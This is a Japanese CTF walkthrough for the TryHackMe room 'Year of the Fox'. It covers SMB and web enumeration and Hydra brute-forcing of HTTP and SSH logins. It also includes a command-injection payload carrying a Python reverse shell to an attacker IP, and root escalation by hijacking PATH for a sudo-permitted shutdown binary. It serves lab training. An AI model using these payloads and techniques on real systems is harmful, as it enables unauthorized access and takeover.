# Year of the Fox CTF

https://tryhackme.com/room/yotf

## Enumeration

```shell
TARGET=10.48.183.50
sudo bash -c "echo $TARGET   fox.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

```sh
sudo nmap -sV -p80,139,445 $TARGET

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
```

HTTP, SMB

80ポートにアクセスすると、BASIC認証のダイアログが出る。

## SMB

yotf ディレクトリがあるがアクセスできない。

```sh
$ smbclient -L \\$TARGET -U ""                             
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        YEAROFTHEFOX         YEAR-OF-THE-FOX
```

```sh
$ smbclient //$TARGET/yotf -U ""
Password for [WORKGROUP\]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

fox, rascal ユーザーを発見。

```sh
$ enum4linux -a $TARGET

[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''                                                                                                                                
                                                                                                                                                                                                                                          
S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)                                                                                                                                                           
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                                                                               
                                                                                                                                                                                                                                          
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                                                         
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                               
                                                                                                                                                                                                                                          
S-1-22-1-1000 Unix User\fox (Local User)                                                                                                                                                                                                  
S-1-22-1-1001 Unix User\rascal (Local User)
```

HTTPで、rascalユーザーのパスワードをブルートフォース成功した。

```sh
root@ip-10-48-96-150:~# hydra -l rascal -P /usr/share/wordlists/rockyou.txt fox.thm -m / http-get -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-20 05:51:02
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344398 login tries (l:1/p:14344398), ~478147 tries per task
[DATA] attacking http-get://fox.thm:80/
[80][http-get] host: fox.thm   login: rascal   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-20 05:51:2
```

## HTTP Rascal's Search System

foxと打ったら、テキストファイル名が返ってきた。

```http
HTTP/1.1 200 OK
Date: Tue, 20 Jan 2026 05:57:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 11
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

["fox.txt"]
```

- a -> `important-data.txt`
- c -> `creds2.txt`
- txt -> `["creds2.txt","fox.txt","important-data.txt"]`
- `*` -> `["creds2.txt","fox.txt","important-data.txt"]`

ブラインドコマンドインジェクションが成立する。

```json
{"target":"\";ping -c 3 192.168.129.39;\""}
```

```sh
$ sudo tcpdump -ni tun0 icmp 
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:29:36.055743 IP 10.48.183.50 > 192.168.129.39: ICMP echo request, id 13387, seq 1, length 64
15:29:36.055837 IP 192.168.129.39 > 10.48.183.50: ICMP echo reply, id 13387, seq 1, length 64
15:29:37.039018 IP 10.48.183.50 > 192.168.129.39: ICMP echo request, id 13387, seq 2, length 64
15:29:37.039038 IP 192.168.129.39 > 10.48.183.50: ICMP echo reply, id 13387, seq 2, length 64
15:29:38.022186 IP 10.48.183.50 > 192.168.129.39: ICMP echo request, id 13387, seq 3, length 64
15:29:38.022205 IP 192.168.129.39 > 10.48.183.50: ICMP echo reply, id 13387, seq 3, length 64
```

リバースシェル

```sh
{"target":"\";python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.129.39\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")';\""}
```

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.183.50] 60824
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

webフラグ発見。

```sh
www-data@year-of-the-fox:/$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/snap/*" -not -path "/usr/include/*" -not -path "/var/lib/*" -not -path "/usr/lib/*" -no-path "/snap/core*" -exec grep -i -I "THM{" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'
/var/www/web-flag.txt:THM{[REDACTED]}
```

## 権限昇格

ファイル発見。2ファイルは空。

```sh
www-data@year-of-the-fox:/var/www/files$ ls -al
total 12
drwxr-xr-x 2 root root 4096 May 31  2020 .
drwxr-xr-x 4 root root 4096 May 31  2020 ..
-rw-r--r-- 1 root root  154 May 31  2020 creds2.txt
-rw-r--r-- 1 root root    0 May 31  2020 fox.txt
-rw-r--r-- 1 root root    0 May 31  2020 important-data.txt
```

```sh
www-data@year-of-the-fox:/var/www/files$ cat creds2.txt
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX
UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
```

base32

```sh
Yzc0MzQxYjI2ZDI5YWQ0MWRhNmNjNjhmZWVkZWJkMTYxMTAzNzc2NTU1YzIxZDc3ZTNjMmFhMzZk
OGM0NDczMCAgLQo=
```

base64。hexっぽいが不明。

```sh
c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730  -
```

22ポートがローカルでリッスンしている。

```sh
www-data@year-of-the-fox:/var/www/files$ ss -nltp
State                          Recv-Q                          Send-Q                                                     Local Address:Port                                                     Peer Address:Port                          
LISTEN                         0                               128                                                        127.0.0.53%lo:53                                                            0.0.0.0:*                             
LISTEN                         0                               128                                                            127.0.0.1:22                                                            0.0.0.0:*                             
```

socatでSSHポートをトンネリング後、foxユーザーのSSHブルートフォース成功。

```sh
 hydra -l fox -P /usr/share/wordlists/rockyou.txt localhost ssh -t 30 -s 2222
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-20 16:10:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://localhost:2222/
[2222][ssh] host: localhost   login: fox   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-20 16:10:34
```

## 権限昇格２

shutdownをrootとして実行できる。

```sh
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation

```sh
fox@year-of-the-fox:~$ echo /bin/bash > /tmp/poweroff
```

```sh
fox@year-of-the-fox:~$ chmod +x /tmp/poweroff
fox@year-of-the-fox:~$ export PATH=/tmp:$PATH
```

昇格成功

```sh
fox@year-of-the-fox:~$ sudo /usr/sbin/shutdown
root@year-of-the-fox:~# id
uid=0(root) gid=0(root) groups=0(root)
```

・・・

```sh
root@year-of-the-fox:~# cat /root/root.txt
Not here -- go find!
root@year-of-the-fox:~# find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/snap/*" -not -path "/usr/include/*" -not -path "/var/lib/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "THM{" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'
/var/www/web-flag.txt:THM{}
/home/fox/user-flag.txt:THM{}
```

rascalの中にあった。

```sh
root@year-of-the-fox:/home/rascal# ls -al
total 24
drwxr-x--- 2 rascal rascal 4096 Jun  1  2020 .
drwxr-xr-x 4 root   root   4096 May 28  2020 ..
lrwxrwxrwx 1 root   root      9 May 28  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rascal rascal  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 rascal rascal 3771 Apr  4  2018 .bashrc
-r-------- 1 rascal root    158 Jun  9  2020 .did-you-think-I-was-useless.root
-rw-r--r-- 1 rascal rascal  807 Apr  4  2018 .profile
root@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root 
T
H
M
{[REDACTED]
}
```

## 振り返り

- コマンドインジェクションでダブルクォートが必要な点に気付くのが難しかった。
- shutdown の権限昇格が成立しているのは、sudo で secure_path が設定されていないから。

## Tags

#tags:コマンドインジェクション #tags:ブルートフォース
